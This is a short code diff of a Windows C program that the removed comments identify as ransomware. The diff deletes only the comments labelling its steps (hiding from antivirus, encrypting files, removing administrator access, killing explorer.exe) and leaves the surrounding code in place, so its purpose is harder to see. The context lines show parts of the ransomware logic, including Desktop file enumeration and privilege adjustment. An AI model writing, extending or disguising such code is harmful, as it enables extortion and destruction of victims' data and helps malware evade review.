@@ -8,7 +8,7 @@
 
 int main()
 {
-	//Hide the ransomware process from antivirus
+	
 	HANDLE hToken;
 	LUID luid;
 	TOKEN_PRIVILEGES tp;
@@ -41,7 +41,7 @@ int main()
 	RegCloseKey(hkey);
 	free(command2);
 
-	//Encrypt files
+	
 	char root[MAX_PATH];
 	SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, root);
 	unsigned int pathLen = strlen(root) + 2;
@@ -95,7 +95,7 @@ int main()
 	FindClose(hFind);
 	free(path);
 
-	//Remove user administrator access
+	
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
 		TOKEN_PRIVILEGES tp;
 		tp.PrivilegeCount = 1;
@@ -105,7 +105,7 @@ int main()
 		CloseHandle(hToken);
 	}
 
-	//Disable explorer
+	
 	system("taskkill /f /im explorer.exe");
 
 
